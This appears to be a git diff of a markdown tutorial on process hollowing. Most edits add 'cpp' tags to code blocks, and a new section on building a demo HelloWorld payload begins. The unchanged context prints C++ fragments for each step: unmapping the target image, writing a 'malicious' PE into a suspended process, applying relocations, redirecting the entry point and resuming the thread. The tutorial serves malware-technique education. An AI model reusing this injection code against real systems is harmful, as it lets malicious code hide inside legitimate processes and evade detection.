@@ -128,7 +128,7 @@ So after reading the file,
 Of course you are wondering what is this Context or Thread Context, lets take an overview on it. A thread context is a structure that contains the register values and other state information of a thread. It is crucial for operations such as debugging, thread manipulation, and our today's technique ```process hollowing```. The context includes the ```instruction pointer```, ```stack pointer```, and other registers that define the current state of the CPU as it executes the thread. So by manipulating the context, a program can control the execution flow of a thread, which is essential for techniques like process hollowing, where the goal is to replace the code of a legitimate process with malicious code while maintaining the execution context.
 
 So lets see it on the code.
-```
+```cpp
     LPCONTEXT pContext = new CONTEXT();
     pContext->ContextFlags = CONTEXT_FULL;
     if (!GetThreadContext(proc_info.hThread, pContext)) {
@@ -143,8 +143,7 @@ Finally the GetThreadContext function is called to retrieve the context of the t
 
 In process hollowing, obtaining the base address is crucial for locating the Entry Point, it helps in finding the entry point of the process's code, which can be replaced with malicious code.
 
-
-```
+```cpp
     PVOID BaseAddress;
 
     #ifdef _X86_ 
@@ -195,7 +194,7 @@ Here are some common Sections in PE Files.
 
 So i encourage you to do your homeworks about these stuffs.
 
-```
+```cpp
     printf("Unmapping Section.\n");
     HMODULE hNTDLL = GetModuleHandleA("ntdll");
     FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
@@ -222,7 +221,7 @@ As usual, to allocate memory in the target process we use VirtualAllocEx().
 ```
 After that we retrieve the DOS and NT headers from the mapped malicious file, as we said before, we allocate space to contain our malicious code in the memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
 
-```
+```cpp
     if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
         printf("Failed to write Headers\n");
         return 0;
@@ -315,7 +314,7 @@ I'll break the code to steps,
 - **Looking for .reloc section** 
 We need to grap the .reloc section to adjust adresses, so looping on the sections find the .reloc.
 Also we calculate the address of each section header using the base address of the image and the size of the headers.
-```
+```cpp
 for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
     sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
     char pSectionName[] = ".reloc";
@@ -336,7 +335,7 @@ In this part i'll talk a little bit about .reloc section architecture in order t
 The architecture of the .reloc section consists of multiple relocation blocks, each starting with a BASE_RELOCATION_BLOCK structure. This structure contains two main fields: PageAddress, which specifies the base address for the relocations within the block, and BlockSize, which indicates the size of the block including the header and the relocation entries.
 Following the block header, the block contains an array of BASE_RELOCATION_ENTRY structures. Each entry represents a relocation to be performed and consists of a type field and an offset field. The type field specifies the type of relocation ( this is very important to understand ), such as adjusting a 32-bit address, and the offset field specifies the location within the 4KB page where the relocation is to be applied. The program uses these blocks and entries to update the addresses in the PE file ( malicious file ), ensuring that the code and data are correctly positioned in memory regardless of where the program is loaded.
 I think that now we can proceed.
-```
+```cpp
     while (Offset < RelocData.Size) {
         PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&EvilImage[RelocAddress + Offset];
         printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);
@@ -351,7 +350,7 @@ As we are seeing in the code, we loop to process each relocation block in the se
 after that, we count the number of entries inside the current block ( EntryCount ) and then retrive the array these relocation entries ( pBlocks ).
 
 Now we need to loop throw these entries to adjust adresses.
-```
+```cpp
         for (int x = 0; x < EntryCount; x++) {
             Offset += sizeof(BASE_RELOCATION_ENTRY);
             if (pBlocks[x].Type == 0) {
@@ -364,7 +363,7 @@ Now we need to loop throw these entries to adjust adresses.
 So the for loop looks for the entries that require relocation, Relocation entries with type 0 are skipped as they do not require relocation.
 
 When we hit an entries that require relocation, we calculate the address in the section that needs to be relocated ( FieldAddress ), by adding the the block adress with the offset of the entry.
-```
+```cpp
 #ifdef _X86_
 					// Read The Value In That Address
 					DWORD EnrtyAddress = 0;
@@ -399,6 +398,7 @@ Now for both 32bit and 64bit architectures, we read the current value of the rel
 Anddd the relocation is done. ( For it's still the hard part ).
 
 ### Updating Context and Resuming the Process
+
 In this last part we should modify the context structure (pContext) to set the Instruction Pointer (IP) register to the entry point of the executable. This ensures that when the process is resumed, it starts executing from the correct location within the newly loaded image.
 
 Doing this for both architectures.
@@ -407,7 +407,7 @@ pContext->Eax is set to the base address of the loaded image plus the entry poin
 - **For 64-bit (x64)**
 pContext->Rcx is similarly set to the base address plus the entry point offset, but in this case, it updates the RCX register.
 
-```
+```cpp
     #ifdef _X86_
     pContext->Eax = (DWORD)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
     #endif
@@ -425,4 +425,11 @@ pContext->Rcx is similarly set to the base address plus the entry point offset, 
     }
 }
 ```
-And finally we can resume the main thread by using ResumeThread(proc_info.hThread)
+And finally we can resume the main thread by using ResumeThread(proc_info.hThread).
+
+## Creating malicious executable
+
+In this part, We will create a HelloWorld executable that show a message box.
+
+
+
